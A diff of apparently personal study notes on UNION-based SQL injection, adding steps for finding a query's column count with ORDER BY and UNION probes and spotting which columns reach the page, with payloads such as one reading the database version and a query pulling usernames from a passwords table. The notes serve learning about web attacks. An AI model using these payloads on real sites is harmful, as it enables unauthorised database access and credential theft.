@@ -96,7 +96,7 @@ We can fill the extra columns with junk data to make even columns
 When filling columns with junk, the data type must match the original column
 For advanced injection, We can use 'NULL' as 'NULL' fits all data types
 
-Assuming: The products table has 2 column, and we only want to retrieve username from the passwords table:
+Assuming: The products table has 2 columns, and we only want to retrieve username from the passwords table:
 ```sql
 SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords;
 #                                                                    ^ injected junk
@@ -107,6 +107,39 @@ SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 fro
 ### Considerations
 UNION statments can only operate on SELECT statements with an equal number of columns
 
+Not all columns may be displayed to the user
+    This is when it's advantagous to use numbers in your injection, because you can tell if a column 
+    is not displayed.
+### In practice
+We know that we need to know the number of columns, so we have to figure that out.  
+There or 2 methods we can use to find the number of columns, ```ORDER BY``` and ```UNION```  
+
+Using ORDER BY
+```sql
+' order by 1-- 
+# This should a normal looking table ordered by the 1st column
+# Now we increase the column number until it breaks
+' order by 2-- 
+' order by 3--
+# When the query breaks by either showing an error or showing nothing, you'll know the number of columns
+# was the last number that worked. 
+```
+Using UNION
+```sql
+# Unlike ORDER BY, this method returns an error until it succeeds.
+# Here we simply increase the number in the select until we get results
+cn' UNION select 1,2,3-- 
+cn' UNION select 1,2,3,4-- 
+# We will get an error or no results until we hit the right number of columns
+### Determining which columns are displayed to the page
+It is very common that not all columns are displayed to the user.
+Very important to figure out which columns are displayed so you know where to put your injection to get it displayed
+For example, the "id" field is often used to link to other tables, but is almost never displayed to the user
+To Find out, use numbers as your junk data, so you can see which numbers are displayed easily
+```sql
+# Assuming column 1 is not displayed to the end user
+cn' UNION select 1,@@version,3,4-- 
+```
 ## In-Band
 ### Summary
 Output of both the intended and new query are output directly to the screen and can be directly read.
